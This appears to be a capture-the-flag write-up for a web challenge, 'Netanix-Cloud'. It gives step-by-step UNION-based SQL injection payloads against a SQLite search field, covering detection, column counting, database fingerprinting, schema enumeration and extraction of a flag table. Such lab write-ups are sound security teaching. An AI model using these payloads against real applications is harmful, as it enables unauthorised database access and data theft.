# Netanix-Cloud

**Category:** Web Exploitation
**Platform:** Netanix / NxCTF  

---

## Overview

A web application with a search parameter vulnerable to UNION-based SQL injection. The backend uses SQLite. The flag is stored in an obfuscated table name inside the database.

---

## Solution

### Step 1 — Detect SQL Injection

Test the search parameter with a basic `OR 1=1` payload:

```sql
' OR 1=1-- -
```

This returns all 10 services regardless of the search term — confirming SQL injection.

### Step 2 — Determine the Number of Columns

Use `ORDER BY` to find the column count (binary search style):

```sql
' ORDER BY 5-- -
```

This throws an error. Try `ORDER BY 4`:

```sql
' ORDER BY 4-- -
```

No error — confirming the query has **4 columns**.

### Step 3 — Identify Visible (Reflected) Columns

Use a UNION injection with placeholder values to find which columns appear in the response:

```sql
' UNION SELECT 1,2,3,4-- -
```

Columns **2 and 3** are reflected in the page output.

### Step 4 — Fingerprint the Database

Test for MySQL:

```sql
' UNION SELECT 1,version(),3,4-- -
```

Returns an error — not MySQL.

Test for SQLite:

```sql
' UNION SELECT 1,sqlite_version(),3,4-- -
```

Returns `3.45.2` — confirming **SQLite**.

### Step 5 — Enumerate Tables

Query the internal `sqlite_master` schema table to list all user-defined tables:

```sql
' UNION SELECT 1,group_concat(name),3,4 FROM sqlite_master WHERE type='table'-- -
```

Results include a suspicious table: **`flags_e31679cf`**

### Step 6 — Enumerate Columns of the Flag Table

Use SQLite's `pragma_table_info()` to get the column names:

```sql
' UNION SELECT 1,group_concat(name),3,4 FROM pragma_table_info('flags_e31679cf')--
```

Returns two columns: **`id`** and **`value`**

### Step 7 — Extract the Flag

Dump the `value` column from the flag table:

```sql
' UNION SELECT 1,value,3,4 FROM flags_e31679cf--
```

The flag is returned in the response.

---

## SQLite-Specific Notes

| MySQL equivalent | SQLite equivalent |
|-----------------|------------------|
| `information_schema.tables` | `sqlite_master WHERE type='table'` |
| `information_schema.columns` | `pragma_table_info('table_name')` |
| `version()` | `sqlite_version()` |

---

## Flag

> Extracted from the `value` column of `flags_e31679cf` via UNION injection.
